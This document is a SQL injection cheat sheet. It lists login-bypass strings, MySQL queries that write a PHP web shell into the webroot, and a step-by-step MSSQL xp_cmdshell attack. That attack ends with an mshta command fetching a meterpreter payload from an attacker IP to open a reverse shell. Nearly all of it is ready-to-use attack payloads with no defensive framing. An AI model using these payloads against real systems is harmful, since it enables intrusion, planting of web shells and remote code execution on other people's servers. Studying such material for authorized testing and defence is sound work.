
##### SQL Injection

###### Login Bypass 
    ```
    ' or '1'='1
    ```
    meh' OR 3=3;#
    meh' OR 2=2 LIMIT 1;#
    meh' OR 'a'='a
    meh' OR 1=1 --+
    -'
    ' '
    '&'
    '^'
    '*'
    ' or ''-'
    ' or '' '
    ' or ''&'
    ' or ''^'
    ' or ''*'
    "-"
    " "
    "&"
    "^"
    "*"
    " or ""-"
    " or "" "
    " or ""&"
    " or ""^"
    " or ""*"
    or true--
    " or true--
    ' or true--
    ") or true--
    ') or true--
    ' or 'x'='x
    ') or ('x')=('x
    ')) or (('x'))=(('x
    " or "x"="x
    ") or ("x")=("x
    ")) or (("x"))=(("x
    ```

###### Shell from sql-injection

- MySQL (https://www.infosecinstitute.com/resources/hacking/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/)
 The plan is to upload a webshell in the webroot. Identifying the correct webroot is very important. /var/www/ is the webroot which is default location of the Apache server.
    - Load files
    ```
    http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
    ```
    - Write files
    ```
    http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'

    http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
    ```

- MSSQL - xp_cmdshell (https://medium.com/@alokkumar0200/owning-a-machine-using-xp-cmdshell-via-sql-injection-manual-approach-a380a5e2a340)
    1. Finding Number of Columns in database.
    ```
    admin' UNION SELECT 1,2,3,4,5--+
    ```
    2. Check if we can run stack queries. (This should bring a delay of 8 seconds in response.)
    ```
    admin' UNION SELECT 1,2,3,4,5; WAITFOR DELAY '0:0:8'--+
    ```
    3. Below query can be used to check our privileges if we can enable xp_cmdshell via SQL Injection (Result of above query should be 1)
    ```
    admin' UNION SELECT 1,is_srvrolemember('sysadmin'),3,4,5--+
    ```
    4. Below queries will configure xp_cmdshell for us.
    ```
    admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1--+
    admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
    admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1--+
    admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
    ```
    5. Check if we can execute OS commands or not. Let’s ping our Burp Collaborator, query should give us a DNS request on Burp Collaborator. (ngrok can also be used if you don’t have Burp Suite Professional).
    ```
    admin' UNION SELECT 1,2,3,4,5; EXEC xp_cmdshell 'ping <collab_url>.burpcollaborator.net'--+
    ```
    6. Getting Shell
        - Created a meterpreter staged payload using msfvenom and hosted it on local server which will finally land us to the SHELL. And started listener on metasploit. Using below query to get the our payload from local server and execute it on victim’s machine.
    ```
    admin' UNION SELECT 1,2; EXEC xp_cmdshell 'mshta.exe http://<attacker_IP>:8000/shell.hta'--+
    ```


